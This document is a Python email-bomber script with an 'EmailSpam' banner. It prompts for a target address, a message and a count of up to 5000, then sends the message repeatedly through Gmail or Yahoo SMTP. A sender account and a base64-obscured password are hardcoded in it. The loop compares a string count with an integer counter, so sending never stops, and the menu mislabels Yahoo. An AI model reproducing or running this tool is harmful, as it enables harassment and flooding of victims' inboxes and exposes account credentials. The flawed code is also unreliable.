import smtplib
import time
import os
import getpass
import sys
import base64

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	


def bomb():
	os.system('clear')
	print(bcolors.OKGREEN + '''                            																											
[>] Preparing and attacking ...''')

print(bcolors.OKGREEN + '''

▓█████  ███▄ ▄███▓ ▄▄▄       ██▓  ██▓      ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒ ▓██▒    ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒ ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░ ▒██░      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██
░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░ ░██████▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░  ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
 ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░  ░ ▒  ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
   ░   ░      ░     ░   ▒    ▒ ░  ░  ░   ░  ░  ░  ░░         ░   ▒   ░      ░
   ░  ░       ░         ░  ░ ░       ░  ░      ░                 ░  ░       ░

''')

print(bcolors.WARNING + '''												       
\033[95mSelect Mail Service:													
[1] Gmail  -  powered google								
[2] Yahoo  -  powered microsoft
''')
try:
	server = input(bcolors.WARNING + 'Mail Server: ' + bcolors.ENDC)
	user = 'smtp0python@gmail.com'
	base64_message = 'c210cDBweXRob24xOGdtYWls'
	base64_bytes = base64_message.encode('ascii')
	message_bytes = base64.b64decode(base64_bytes)
	pwd = message_bytes.decode('ascii')
	to = input(bcolors.OKGREEN + 'Send To: ' + bcolors.ENDC)
	subject = input(bcolors.LITBU + 'Subject (Optional): ' + bcolors.ENDC)
	body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'Number of Emails to send (1-5000): ' + bcolors.ENDC)
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()

#Gmail

if server == '1' or server == '01'  or server == 'gmail' or server == 'Gmail':
	bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
			no += 1
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except:
			print("Messange failed to Send! ")
	server.close()
	
#Yahoo
elif server == '2' or server == '02' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	bomb()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no + 1) + ' emails' + bcolors.ENDC)
			no += 1
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
			sys.exit()
		except:
			print("Messange failed to Send! ")
	server.close()
	
else:
	print('Works only with Gmail, Yahoo ...')
	sys.exit()

